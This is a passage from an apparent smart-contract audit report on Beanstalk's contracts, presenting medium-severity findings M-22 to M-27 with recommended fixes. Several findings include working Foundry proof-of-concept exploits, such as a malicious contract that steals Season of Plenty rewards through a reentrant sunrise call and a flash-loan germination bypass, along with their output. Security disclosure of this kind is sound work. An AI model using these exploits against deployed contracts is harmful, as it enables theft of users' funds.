        uint256 plenty = s.accts[account].sop.perWellPlenty[well].plenty;
        if (plenty > 0 && LibWell.isWell(well)) {
            IERC20[] memory tokens = IWell(well).tokens();
            IERC20 sopToken = tokens[0] != C.bean() ? tokens[0] : tokens[1];
            LibTransfer.sendToken(sopToken, plenty, LibTractor._user(), toMode);
            s.accts[account].sop.perWellPlenty[well].plenty = 0;

            // reduce from Beanstalk's total stored plenty for this well
            s.sys.sop.plentyPerSopToken[address(sopToken)] -= plenty;

            emit ClaimPlenty(account, address(sopToken), plenty);
        }
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/SiloFacet/ClaimFacet.sol#L104>

```solidity
    function pipelineConvert(
        address inputToken,
        int96[] calldata stems,
        uint256[] calldata amounts,
        address outputToken,
        AdvancedFarmCall[] calldata advancedFarmCalls
    )
        external
        payable
        fundsSafu
        nonReentrant
        returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv)
    {
        //.....
        uint256 grownStalk;
        (grownStalk, fromBdv) = LibConvert._withdrawTokens(inputToken, stems, amounts, fromAmount);

        (toAmount, grownStalk, toBdv) = LibPipelineConvert.executePipelineConvert(
            inputToken,
            outputToken,
            fromAmount,
            fromBdv,
            grownStalk,
            advancedFarmCalls
        );

        toStem = LibConvert._depositTokensForConvert(outputToken, toAmount, toBdv, grownStalk);
        //.....        
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/silo/PipelineConvertFacet.sol#L62>

```solidity
    function advancedPipe(
        AdvancedPipeCall[] calldata pipes,
        uint256 value
    ) external payable fundsSafu noSupplyIncrease returns (bytes[] memory results) {
        results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);
        LibEth.refundEth();
    }
```

<https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/farm/DepotFacet.sol#L51>

### Test Case

The following foundry test implementes the scenario explained above.

```solidity
   function testConvertBeanToLPManipulation() public {
        // users[1] = Alice
        // users[2] = Bob
        int96 stem;

        uint AliceDepositAmount = 2000e6;
        uint BobDepositAmount = 2000e6;

        // manipulate well so we won't have a penalty applied
        setDeltaBforWell(int256(AliceDepositAmount + BobDepositAmount), beanEthWell, C.WETH);

        bean.mint(users[1], AliceDepositAmount);
        bean.mint(users[2], BobDepositAmount);

        // mint some soil, that allows to sow beans later
        season.setSoilE(100e6);

        console.log("season number before deposit: ", bs.season());

        address[] memory userAddress = new address[](1);

        userAddress[0] = users[1]; // Alice       
        depositForUsers(userAddress, C.BEAN, AliceDepositAmount, LibTransfer.From.EXTERNAL);

        userAddress[0] = users[2]; // Bob 
        depositForUsers(userAddress, C.BEAN, BobDepositAmount, LibTransfer.From.EXTERNAL);

        bs.siloSunrise(0);
        bs.siloSunrise(0); // season 3

        MaliciousContract maliciousContract = new MaliciousContract(BEANSTALK, C.BEAN);
        // assuming the malicious contract has 100 beans already
        bean.mint(address(maliciousContract), 100e6);
        // records the current bean total supply
        maliciousContract.initialize();

        console.log("season number after two seasons are elapsed: ", bs.season()); // season 3
 

        // do the convert

        // Create arrays for stem and amount
        int96[] memory stems = new int96[](1);
        stems[0] = stem;

        AdvancedFarmCall[] memory beanToLPFarmCalls = createLPToBeanFarmCallsWithSunrise(
            BobDepositAmount,
            maliciousContract
        );

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BobDepositAmount;

        bs.mow(users[1], C.BEAN);
        bs.mow(users[2], C.BEAN);

        SeasonGettersFacet seasonGetters = SeasonGettersFacet(BEANSTALK);

        console.log("total roots before convert: ", bs.totalRoots());
        console.log("total rain roots before convert: ", seasonGetters.rain().roots);

        console.log("Alice balanceOfRoots before convert: ", bs.balanceOfRoots(users[1]));
        console.log("Alice balance of rainRoots before convert: ", bs.balanceOfRainRoots(users[1]));

        console.log("Bob balanceOfRoots before convert: ", bs.balanceOfRoots(users[2]));
        console.log("Bob balance of rainRoots before convert: ", bs.balanceOfRainRoots(users[2]));


        vm.prank(users[2]); // do this as user 2
        convert.pipelineConvert(
            C.BEAN, // input token
            stems, // stems
            amounts, // amount
            beanEthWell, // token out
            beanToLPFarmCalls // farmData
        );


        bs.mow(users[1], C.BEAN);
        bs.mow(users[2], beanEthWell);

        console.log("total roots after convert: ", bs.totalRoots());
        console.log("total rain roots after convert: ", seasonGetters.rain().roots);

        console.log("Alice balanceOfRoots after convert: ", bs.balanceOfRoots(users[1]));
        console.log("Alice balance of rainRoots after convert: ", bs.balanceOfRainRoots(users[1]));


        console.log("Bob balanceOfRoots after convert: ", bs.balanceOfRoots(users[2]));
        console.log("Bob balance of rainRoots after convert: ", bs.balanceOfRainRoots(users[2]));


    }
```

```solidity
    function createLPToBeanFarmCallsWithSunrise(
        uint256 amountOfBean,
        MaliciousContract maliciousContract
    ) private view returns (AdvancedFarmCall[] memory output) {

        // encode sunrise
        // to mimic a season that rains, the helper function rainSunrise is encoded
        bytes memory rainSunriseEncoded = abi.encodeWithSignature(
            "rainSunrise()"
        );

        // setup approve max call
        bytes memory approveEncoded = abi.encodeWithSelector(
            IERC20.approve.selector,
            beanEthWell,
            MAX_UINT256
        );

        uint256[] memory tokenAmountsIn = new uint256[](2);
        tokenAmountsIn[0] = amountOfBean;
        tokenAmountsIn[1] = 0;

        // encode Add liqudity.
        bytes memory addLiquidityEncoded = abi.encodeWithSelector(
            IWell.addLiquidity.selector,
            tokenAmountsIn, // tokenAmountsIn
            0, // min out
            C.PIPELINE, // recipient
            type(uint256).max // deadline
        );

        // encode the function run in the MaliciousContract
        bytes memory runEncoded = abi.encodeWithSignature(
            "run()"
        );

        // Fabricate advancePipes:
        AdvancedPipeCall[] memory advancedPipeCalls = new AdvancedPipeCall[](4);

        // Action 0: Sunrise into season 4 where rain happens.
        advancedPipeCalls[0] = AdvancedPipeCall(
            address(season), // target
            rainSunriseEncoded, // calldata
            abi.encode(0) // clipboard
        );        

        // Action 1: approve the Bean-Eth well to spend pipeline's bean.
        advancedPipeCalls[1] = AdvancedPipeCall(
            C.BEAN, // target
            approveEncoded, // calldata
            abi.encode(0) // clipboard
        );

        // Action 2: Add One sided Liquidity into the well.
        advancedPipeCalls[2] = AdvancedPipeCall(
            beanEthWell, // target
            addLiquidityEncoded, // calldata
            abi.encode(0) // clipboard
        );

        // Action 3: Executed the function run in the MaliciousContract.
        advancedPipeCalls[3] = AdvancedPipeCall(
            address(maliciousContract), // target
            runEncoded, // calldata
            abi.encode(0) // clipboard
        );

        // Encode into a AdvancedFarmCall. NOTE: advancedFarmCall != advancedPipeCall.

        // AdvancedFarmCall calls any function on the beanstalk diamond.
        // advancedPipe is one of the functions that its calling.
        // AdvancedFarmCall cannot call approve/addLiquidity, but can call AdvancedPipe.
        // AdvancedPipe can call any arbitrary function.
        AdvancedFarmCall[] memory advancedFarmCalls = new AdvancedFarmCall[](1);

        bytes memory advancedPipeCalldata = abi.encodeWithSelector(
            depot.advancedPipe.selector,
            advancedPipeCalls,
            0
        );

        advancedFarmCalls[0] = AdvancedFarmCall(advancedPipeCalldata, new bytes(0));
        return advancedFarmCalls;
    }
```

```solidity
/*
 SPDX-License-Identifier: MIT
*/

pragma solidity ^0.8.20;

import {TestHelper, C} from "test/foundry/utils/TestHelper.sol";

import "hardhat/console.sol";

interface IBeanstalk {
    enum From {
        EXTERNAL,
        INTERNAL,
        EXTERNAL_INTERNAL,
        INTERNAL_TOLERANT
    }
    enum To {
        EXTERNAL,
        INTERNAL
    }

    function sowWithMin(
        uint256 beans,
        uint256 minTemperature,
        uint256 minSoil,
        From mode
    ) external payable returns (uint256 pods);
}

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}

contract MaliciousContract is TestHelper {
    IBeanstalk iBeanstalk;
    address bean;
    uint initialSupply;

    constructor(
        address _addressBeanstalk,
        address _bean
    ) {
        iBeanstalk = IBeanstalk(_addressBeanstalk);
        bean = _bean;
    }

    function initialize() public {
        // records the total supply of bean before the convert
        initialSupply = IERC20(bean).totalSupply();
    }

    function run() public {
        // allow the protocol to burn beans from this contract
        IERC20(bean).approve(address(iBeanstalk), type(uint256).max);

        // records the total supply of bean after sunrise 
        // after surise, there is a flood, so total supply of bean increases
        uint256 currentSupply = IERC20(bean).totalSupply();

        // diffTotalSupply is the amount of beans newly minted during convert
        // diffTotalSupply includes two factors
        // First: the amount of beans minted due to the flood
        // Second: the amount of beans minted as incetive to the caller of sunrise
        uint256 diffTotalSupply = currentSupply - initialSupply;

        // during convert it is not possible to mints new beans
        // because the function advancedPipe in the contract DepotFacet has the modifier noSupplyIncrease 
        // to bypass this limitation, the same amount of newly minted beans are sowed in the protocol, where they are burned
        // so the total supply of beans does not change, and some pods are minted
        // this amount of beans sowed in the protocol are coming from the initial beans holded by this contract
        // it is assumed that this contract was holding 1000e6 beans before
        iBeanstalk.sowWithMin(diffTotalSupply, 0, 0, IBeanstalk.From.EXTERNAL);
    }

}

```

The output is:

```Solidity
  season number before deposit:  1
  season number after two seasons are elapsed:  3
  total roots before convert:  40016000000000000000000000
  total rain roots before convert:  0
  Alice balanceOfRoots before convert:  20008000000000000000000000
  Alice balance of rainRoots before convert:  0
  Bob balanceOfRoots before convert:  20008000000000000000000000
  Bob balance of rainRoots before convert:  0
  total roots after convert:  38590716386428000000000000
  total rain roots after convert:  20008000000000000000000000
  Alice balanceOfRoots after convert:  20012000000000000000000000
  Alice balance of rainRoots after convert:  20008000000000000000000000
  Bob balanceOfRoots after convert:  18578716386428000000000000
  Bob balance of rainRoots after convert:  18571291070000000000000000
```

## Impact

Stealing SoP rewards.

## Tools Used

## Recommendations

It is recommended to put a reentrancy guard for calling `sunrise`.

## <a id='M-22'></a>M-22. Allowing the execution of more than a single `sunrise` function when enough time has passed is really dangerous

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined), [fyamf](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

It is possible to advance multiple seasons if enough time passes. That can lead to serious problems for the protocol

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonFacet.sol#L79-L84

## Vulnerability Details

It is possible to advance multiple seasons if enough time has passed. That can lead to some issues that can be exploited in the protocol.

Issue nº1:
Beanstalk was previously hacked due to a governance attack powered by a flashloan. The hacker was able to get enough voting power (stalk) to unilaterally drain all funds. This was possible because when someone deposited into the silo he got the corresponding amount of stalk in the same transaction. After this event, the Beanstalk team changed that to prevent flashloan attacks by putting in a germinating state to stalk that new deposits would mint. With this state, the user will not get immediately the stalk and a flashloan attack would be impossible to execute because it needs to be done in the same transaction. This germinating state requires to pass 2 seasons in order to claim the stalk that has already germinated. Seasons are meant to be 1 hour long so it would take 2 hours to claim the stalk. However, if enough time elapses it is possible to advance multiple seasons in the same transaction.

Let's first look closely at the `sunrise` function:

```Solidity
    function gm(
        address account,
        LibTransfer.To mode
    ) public payable fundsSafu noOutFlow returns (uint256) {
        require(!s.sys.paused, "Season: Paused.");
        require(seasonTime() > s.sys.season.current, "Season: Still current Season.");

        uint32 season = stepSeason();

        int256 deltaB = stepOracle();
        uint256 caseId = calcCaseIdandUpdate(deltaB);
        LibGerminate.endTotalGermination(season, LibWhitelistedTokens.getWhitelistedTokens());
        LibGauge.stepGauge();
        stepSun(deltaB, caseId);

        return incentivize(account, mode);
    }

    function seasonTime() public view virtual returns (uint32) {
        if (block.timestamp < s.sys.season.start) return 0;
        if (s.sys.season.period == 0) return type(uint32).max;
        return uint32((block.timestamp - s.sys.season.start) / s.sys.season.period);
    }
```

The `seasonTime` function returns the current timestamp minus the timestamp when the protocol either started or unpaused in case it was paused at some point. Hence the time elapsed from the beggining divided by the period which should be 1 hour. This is the theorical amount of season that should have passed if the sunrise function whould have been called exactly when an hour would have passed. The require statement ensures that this amount is greater than the current season number. This means that if for example 2 hours passed before the last sunrise call, it is possible to call the sunrise function 2 times in the same transaction.

Since the flashloan protection consists in 2 season germination for the stalk, it means that it can be bypassed by anyone when more than 2 hours passed without calling the sunrise function. This event can happen for a lot of factors:

* Blockchain outrage (considering it will be migrated to an L2)
* Block stuffing
* Normal users not calling sunrise function

If this event happens someone can just take a flashloan, deposit into the silo, call the sunrise function twice and get all the stalk immediately proportional to the flashloan.

Proof of concept:
The following test uses the `silo.t.sol` setup.

```Solidity
    function test_bypassFlashLoanProtection() public {
        uint256 depositAmount = 100_000_000 * 10 ** 6;

        // User takes a flashloan
        mintTokensToUser(farmers[0], C.BEAN, depositAmount);


        vm.startPrank(farmers[0]);
        // Enough time passes equivalent to 2 seasons
        skip(100000000);

        // Malicious user deposits the flashloan
        (uint256 amount, , int96 stem) = bs.deposit(C.BEAN, depositAmount, 0);
        uint256 stalkBefore = bs.balanceOfStalk(farmers[0]);

        // He advances 2 seasons
        uint256 incentive1 = bs.sunrise();
        uint256 incentive2 = bs.sunrise();

        emit Debug(stalkBefore);
        emit Debug(bs.balanceOfStalk(farmers[0]));
    }
```

Result:

```Solidity
Ran 1 test for test/foundry/silo/silo.t.sol:SiloTest
[PASS] test_bypassFlashLoanProtection() (gas: 1458708)
Traces:
  [1458708] SiloTest::test_bypassFlashLoanProtection()

    ...

    ├─ emit Debug(number: 0)
    ├─ [6932] Beanstalk::balanceOfStalk(Farmer 1: [0xA57dB32D977ed1D8d2012Ac42f66C75a001Ba71C]) [staticcall]
    │   ├─ [6487] SiloGettersFacet::balanceOfStalk(Farmer 1: [0xA57dB32D977ed1D8d2012Ac42f66C75a001Ba71C]) [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ emit Debug(number: 1000000000000000000 [1e18])
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 519.94ms (9.24ms CPU time)

Ran 1 test suite in 1.25s (519.94ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As we can see, the user got stalk immediately without any germination because more than a single season elapsed. This break the flashloan protection because a user can take a flashloan and get a huge amount of stalk in the same transaction. With this stalk, he can propose BIP or redeem them for beans.

Issue nº2:
When updating the oracle in the `sunrise` function, the price fetched from the `twaDeltaB` will be instantaneous and will not be actually time weighted which can lead to manipulations.

```Solidity
    function twaDeltaB(
        address well,
        bytes memory lastSnapshot
    ) internal view returns (int256, bytes memory, uint256[] memory, uint256[] memory) {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // Try to call `readTwaReserves` and handle failure gracefully, so Sunrise does not revert.
        // On failure, reset the Oracle by returning an empty snapshot and a delta B of 0.
        Call[] memory pumps = IWell(well).pumps();
        try
            ICumulativePump(pumps[0].target).readTwaReserves(
                well,
                lastSnapshot,
                uint40(s.sys.season.timestamp),
                pumps[0].data
            )
        returns (uint[] memory twaReserves, bytes memory snapshot) {
            IERC20[] memory tokens = IWell(well).tokens();
            // @audit if for some reason 2 gm functions have been called within the same transaction, this lookback will be 0 and the
            // returned price will be instantaneous, hence manipulable.
            (uint256[] memory ratios, uint256 beanIndex, bool success) = LibWell
                .getRatiosAndBeanIndex(tokens, block.timestamp.sub(s.sys.season.timestamp));

            // If the Bean reserve is less than the minimum, the minting oracle should be considered off (1000 beans).
            if (twaReserves[beanIndex] < C.WELL_MINIMUM_BEAN_BALANCE) {
                return (0, snapshot, new uint256[](0), new uint256[](0));
            }

            // If the USD Oracle oracle call fails, the minting oracle should be considered off.
            if (!success) {
                return (0, snapshot, twaReserves, new uint256[](0));
            }

            Call memory wellFunction = IWell(well).wellFunction();
            // Delta B is the difference between the target Bean reserve at the peg price
            // and the time weighted average Bean balance in the Well.
            int256 deltaB = int256(
                IBeanstalkWellFunction(wellFunction.target).calcReserveAtRatioSwap(
                    twaReserves,
                    beanIndex,
                    ratios,
                    wellFunction.data
                )
            ).sub(int256(twaReserves[beanIndex]));

            return (deltaB, snapshot, twaReserves, ratios);
        } catch {
            // if the pump fails, return all 0s to avoid the sunrise reverting.
            return (0, new bytes(0), new uint256[](0), new uint256[](0));
        }
    }
```

The `s.sys.season.timestamp` is the saved timestamp that gets updated when the oracle has computed the delta B. But when 2 seasons get executed in the same transaction, the second one will compute the substraction of the `block.timestamp` minus the `s.sys.season.timestamp` that will have the same value because it has been saved in the same transaction. This will result to 0 and will be used as lookback to fetch the delta B from wells.

## Impact

Medium, the scenario where the sunrise function is not called for more than 2 hours can be pretty rare but a user could leverage this moment to get a lot of benefit with a flashloan or to manipulate the price and get benefit from the manipulated delta B. Medium risk should be good for it.

## Tools Used

Manual review

## Recommendations

I would only allow to call the sunrise function once at a time even when a lot of time passed since the last sunrise call. That would disable this attack and all other components that rely on the season number. Right now all the components that depend on the season number can be manipulated by this same attack when a halting happens for any reason.

## <a id='M-23'></a>M-23. If user has not mown since germination, they'll lose their portion of `plenty`

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

If user has not mown since germination, they'll lose their portion of plenty

## Vulnerability Details

After a user deposits, they have to wait 2 seasons until their deposit `germinates` (until they receive their `stalk` and `roots`). Currently, if the user hasn't mown since germination, their roots will be included in the sum of all roots that should receive plenty, although that's only on paper and they won't realistically be able to claim any of these funds.

When a user deposits, `LibSilo.mintGerminatingStalk` is called which adds the necessary stalk to the global accounting of `unclaimedGerminating`.

```solidity
    function mintGerminatingStalk(address account, uint128 stalk, GerminationSide side) internal {
        AppStorage storage s = LibAppStorage.diamondStorage();

        s.accts[account].germinatingStalk[side] += stalk;

        // germinating stalk are either newly germinating, or partially germinated.
        // Thus they can only be incremented in the latest or previous season.
        uint32 season = s.sys.season.current;
        if (LibGerminate.getSeasonGerminationSide() == side) {
            s.sys.silo.unclaimedGerminating[season].stalk += stalk;
        } else {
            s.sys.silo.unclaimedGerminating[season - 1].stalk += stalk;
        }

        // emit events.
        emit LibGerminate.FarmerGerminatingStalkBalanceChanged(
            account,
            int256(uint256(stalk)),
            side
        );
        emit LibGerminate.TotalGerminatingStalkChanged(season, int256(uint256(stalk)));
    }
```

Then, when the actual germinating season comes, the global `stalk` and `roots` accounting is increased by these values

```solidity
    function endTotalGermination(uint32 season, address[] memory tokens) external {
        AppStorage storage s = LibAppStorage.diamondStorage();

        // germination can only occur after season 3.
        if (season < 2) return;
        uint32 germinationSeason = season.sub(2);

        // base roots are used if there are no roots in the silo.
        // root calculation is skipped if no deposits have been made
        // in the season.
        uint128 finishedGerminatingStalk = s.sys.silo.unclaimedGerminating[germinationSeason].stalk;
        uint128 rootsFromGerminatingStalk;
        if (s.sys.silo.roots == 0) {
            rootsFromGerminatingStalk = finishedGerminatingStalk.mul(uint128(C.getRootsBase()));
        } else if (s.sys.silo.unclaimedGerminating[germinationSeason].stalk > 0) {
            rootsFromGerminatingStalk = s
                .sys
                .silo
                .roots
                .mul(finishedGerminatingStalk)
                .div(s.sys.silo.stalk)
                .toUint128();
        }
        s.sys.silo.unclaimedGerminating[germinationSeason].roots = rootsFromGerminatingStalk;
        // increment total stalk and roots based on unclaimed values.
        s.sys.silo.stalk = s.sys.silo.stalk.add(finishedGerminatingStalk);
        s.sys.silo.roots = s.sys.silo.roots.add(rootsFromGerminatingStalk);
```

Then, when a new raining season starts, this global accounting value is used to determine the total amount of roots to distribute the rewards to:

```solidity
    function handleRain(uint256 caseId) external {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // cases % 36  3-8 represent the case where the pod rate is less than 5% and P > 1.
        if (caseId.mod(36) < 3 || caseId.mod(36) > 8) {
            if (s.sys.season.raining) {
                s.sys.season.raining = false;
            }
            return;
        } else if (!s.sys.season.raining) {
            s.sys.season.raining = true;
            address[] memory wells = LibWhitelistedTokens.getCurrentlySoppableWellLpTokens();
            // Set the plenty per root equal to previous rain start.
            uint32 season = s.sys.season.current;
            uint32 rainstartSeason = s.sys.season.rainStart;
            for (uint i; i < wells.length; i++) {
                s.sys.sop.sops[season][wells[i]] = s.sys.sop.sops[rainstartSeason][wells[i]];
            }
            s.sys.season.rainStart = s.sys.season.current;
            s.sys.rain.pods = s.sys.fields[s.sys.activeField].pods;
            s.sys.rain.roots = s.sys.silo.roots;
```

Hence, we've just shown that although these roots are not claimed to the user, they're included in the plenty allocation.

Now, if we look at the code of `_mow`, we'll see that first `handleRainAndSops` is called and then `LibGerminate.endAccountGermination`.

```solidity
    function _mow(address account, address token) external {
        AppStorage storage s = LibAppStorage.diamondStorage();

        // if the user has not migrated from siloV2, revert.
        uint32 lastUpdate = _lastUpdate(account);

        // sop data only needs to be updated once per season,
        // if it started raining and it's still raining, or there was a sop
        uint32 currentSeason = s.sys.season.current;
        if (s.sys.season.rainStart > s.sys.season.stemStartSeason) {
            if (lastUpdate <= s.sys.season.rainStart && lastUpdate <= currentSeason) {
                // Increments `plenty` for `account` if a Flood has occured.
                // Saves Rain Roots for `account` if it is Raining.
                LibFlood.handleRainAndSops(account, lastUpdate);
            }
        }

        // End account germination.
        if (lastUpdate < currentSeason) {
            LibGerminate.endAccountGermination(account, lastUpdate, currentSeason);
        }
        // Calculate the amount of Grown Stalk claimable by `account`.
        // Increase the account's balance of Stalk and Roots.
        __mow(account, token);

        // update lastUpdate for sop and germination calculations.
        s.accts[account].lastUpdate = currentSeason;
    }
```

Since `handleRainAndSops` calculates the `plenty` user should get based on their roots and `LibGerminate.endAccountGermination` is the function which actually gives the user their roots, because of the order of the functions, in case the user hasn't mown since germination, user will not get the plenty they should get.

## Impact

Loss of funds

## Tools Used

Manual review

## Recommendations

Simply reversing the order would introduce new issue. Fix is non-trivial.

## <a id='M-24'></a>M-24. User will lose the rest of their `plenty` if they fully withdraw during/after `rain`.

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
User will lose their share of `plenty`

## Vulnerability Details
When a user mows during a raining season, they're set `rainRoots`. If a `sop` (Season of plenty) occurs following the rain season, these rain roots are later used to calculate user's plenty.
```solidity
        if (s.sys.season.raining) {
            // If rain started after update, set account variables to track rain.
            if (s.sys.season.rainStart > lastUpdate) {
                s.accts[account].lastRain = s.sys.season.rainStart;
                s.accts[account].sop.rainRoots = s.accts[account].roots;
            }
```
```solidity
        if (s.accts[account].lastRain > 0) {
            // if the last processed SOP = the lastRain processed season,
            // then we use the stored roots to get the delta.
            if (a.lastSop == a.lastRain) {
                previousPPR = a.sop.perWellPlenty[well].plentyPerRoot;
            } else {
                previousPPR = s.sys.sop.sops[a.lastSop][well];
            }
            uint256 lastRainPPR = s.sys.sop.sops[s.accts[account].lastRain][well];

            // If there has been a SOP duing the rain sesssion since last update, process SOP.
            if (lastRainPPR > previousPPR) {
                uint256 plentyPerRoot = lastRainPPR - previousPPR;
                previousPPR = lastRainPPR;
                plenty = plenty.add(
                    plentyPerRoot.mul(s.accts[account].sop.rainRoots).div(C.SOP_PRECISION)
                );
            }
```

The problem is that in the beginning of the `handleRainAndSops` function, if the user has 0 roots, it does a early return and does not allocate the user the necessary `plenty` for the user's `rainRoots`.

```solidity
    function handleRainAndSops(address account, uint32 lastUpdate) private {
        AppStorage storage s = LibAppStorage.diamondStorage();
        // If no roots, reset Sop counters variables
        if (s.a[account].roots == 0) {
            s.a[account].lastSop = s.season.rainStart;
            s.a[account].lastRain = 0;
            return;
        }
```

Considering that if user's `lastUpdated > rainStart` user would have to wait until next `rainSeason` to claim the plenty from the previous, this issue also means that full withdraws inbetween rains will result in losing user's allocated plenty. 

## Impact
Loss of funds


## Tools Used
Manual review 


## Recommendations
Do not make an early return

## PoC
Adding two PoCs, first one is a withdraw during the `rainSeason` and the other one is after the `rainSeason` has finished. Add them to `Flood.t.sol`
```solidity
    function test_lostPlenty() public {
        address sopWell = C.BEAN_ETH_WELL;
        setReserves(sopWell, 1000000e6, 1100e18);

        season.rainSunrise();
        bs.mow(users[1], C.BEAN);

        uint256[] memory depositIds = bs.getTokenDepositIdsForAccount(users[1], C.BEAN);
        (, int96 stem) = LibBytes.unpackAddressAndStem(depositIds[0]);

        LibTransfer.To mode;

        vm.prank(users[1]);
        bs.withdrawDeposit(C.BEAN, stem, 1000e6, 0);
        assertEq(siloGetters.balanceOfRainRoots(users[1]), 10004000000000000000000000);
        assertEq(siloGetters.balanceOfRoots(users[1]), 0);

        season.rainSunrise();
        season.droughtSunrise();
        season.droughtSunrise();
        bs.mow(users[1], C.BEAN);

        uint256 userPlenty = bs.balanceOfPlenty(users[1], sopWell);
        assertEq(userPlenty, 0);
    }

    function test_lostPlenty2() public {
        address sopWell = C.BEAN_ETH_WELL;

        season.rainSunrise(); // rainStart
        bs.mow(users[1], C.BEAN); // lastUpdated = rainStart

        uint256[] memory depositIds = bs.getTokenDepositIdsForAccount(users[1], C.BEAN);
        (, int96 stem) = LibBytes.unpackAddressAndStem(depositIds[0]);
        LibTransfer.To mode;

        season.rainSunrise();   // plenty not yet accrued here.
        bs.mow(users[1], C.BEAN);   // lastUpdated = rainStart + 1
        setReserves(sopWell, 1000000e6, 1100e18);   // setting reserves so next season plenty is accrued 
        season.rainSunrise(); // plenty accrued.
        bs.mow(users[1], C.BEAN);   // this will do nothing as lastUpdated > rainStart 
        season.rainSunrise();
        season.rainSunrise(); // 2nd sop 

        season.droughtSunrise();
        season.droughtSunrise();

        vm.prank(users[1]);
        bs.withdrawDeposit(C.BEAN, stem, 1000e6, 0); // adjust this to 1 wei less and test will fail

        bs.mow(users[1], C.BEAN);

        season.rainSunrise();       // must be raining to enter handleRainAndSops
        bs.mow(users[1], C.BEAN);
        uint256 userPlenty = bs.balanceOfPlenty(users[1], sopWell);
        console.log(userPlenty);
        assertEq(userPlenty, 0);
    }
```
## <a id='M-25'></a>M-25. `redeemDepositsAndInternalBalances` should mow before adding migrated deposits

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`redeemDepositsAndInternalBalances` should mow before adding migrated deposits

## Vulnerability Details
The `redeemDepositsAndInternalBalances` will add `stalk`, `roots` and `bdv` to a user's profile, but will not set their necessary variables (`lastSop`, `lastUpdated` and `lastRain`) as appropriate. Because of this, when mowing the next time, the user will accrue `plenty` as if they've had these deposits since their `lastUpdate` (which can even be 0). 

Worst case scenario, user could be able to drain the protocol.

## Impact
Loss of funds


## Tools Used
Manual review

## Recommendations
Mow before adding migrated deposits
## <a id='M-26'></a>M-26. `fundsSafu` modifier will be useless on L2 before all users have successfully migrated.

_Submitted by [deadrosesxyz](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`fundsSafu` modifier will be useless on L2 before all users have successfully migrated.

## Vulnerability Details
When calculating the token entitlements, the contract will not take into account the funds that are already transferred, but waiting users to claim them (e.g. via `L2ContractMigrationFacet#redeemDepositsAndInternalBalances`.

This would make the modifier useless until all users have successfully redeemed their deposits and would allow for exploits to happen.


## Impact
`Invariable` will be useless and will allow for exploits to happen.

## Tools Used
Manual review


## Recommendations
Add the to-be-claimed funds in `Invariable`
## <a id='M-27'></a>M-27. The function to initialize the whitelisted tokens on L2 will revert due to an out of bound error

_Submitted by [Draiakoo](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The function to initialize the whitelisted tokens on L2 will revert due to an out of bound error because when the `whitelistedStatuses` array have 0 elements the loop will try to access the 0 position and since it will not exist, it will revert

## Relevant GitHub Links:
https://github.com/Cyfrin/2024-05-beanstalk-the-finale/blob/main/protocol/contracts/libraries/Silo/LibWhitelistedTokens.sol#L296-L318

## Vulnerability Details

When the protocol will be deployed on L2 will follow the next sequence:

```JavaScript
  reseeds = [
    reseed1,                        // remove all L1 diamond facets, pause beanstalk and transfer bean LPs to BCM
    reseedDeployL2Beanstalk,        // deploy a new beanstalk on L2
    reseed3,                        // reseed the field component
    reseed4,                        // reseed the barn component
    reseed5,                        // reseed the silo component
    reseed6,                        // reseed internal balances
    reseed7,                        // reseed whitelisted tokens
    reseed8,                        // reseed bean
    reseed9                         // add all facets to the diamond and unpause it
  ];
```

As we can see, the diamond on L2 will not execute any init function, all the reseeds should migrate succesfully all the state from the L1.
However, let's see how it reseeds the whitelisted tokens.

```Solidity
function init(address[] calldata tokens, AssetSettings[] calldata asset) external {
        for (uint i; i < tokens.length; i++) {
            LibWhitelist.whitelistToken(
                tokens[i],
                asset[i].selector,
                asset[i].stalkIssuedPerBdv,
                asset[i].stalkEarnedPerSeason,
                asset[i].encodeType,
                asset[i].gaugePointImplementation.selector,
                asset[i].liquidityWeightImplementation.selector,
                asset[i].gaugePoints,
                asset[i].optimalPercentDepositedBdv,
                asset[i].oracleImplementation
            );
        }
    }
```

To whitelist the tokens, the function `whitelistToken` will be be called. Inside there, the main logic is executed from the `LibWhitelist::whitelistToken`. This function does the following:

```Solidity
    function whitelistToken(
        address token,
        bytes4 selector,
        uint32 stalkIssuedPerBdv,
        uint32 stalkEarnedPerSeason,
        bytes1 encodeType,
        bytes4 gaugePointSelector,
        bytes4 liquidityWeightSelector,
        uint128 gaugePoints,
        uint64 optimalPercentDepositedBdv,
        Implementation memory oracleImplementation
    ) internal {
        
        ...

        verifyWhitelistStatus(token, selector, stalkIssuedPerBdv);

        ...
        
    }


    function verifyWhitelistStatus(
        address token,
        bytes4 selector,
        uint32 stalkIssuedPerBdv
    ) internal {

        (bool isWhitelisted, bool previouslyWhitelisted) = LibWhitelistedTokens.checkWhitelisted(
            token
        );
        
        ...

    }
```

It checks if the token that is wanted to be whitelisted is already in the list to prevent a copy of it. This check is coded in the `LibWhitelistedTokens.checkWhitelisted`:

```Solidity
    function checkWhitelisted(
        address token
    ) internal view returns (bool isWhitelisted, bool previouslyWhitelisted) {
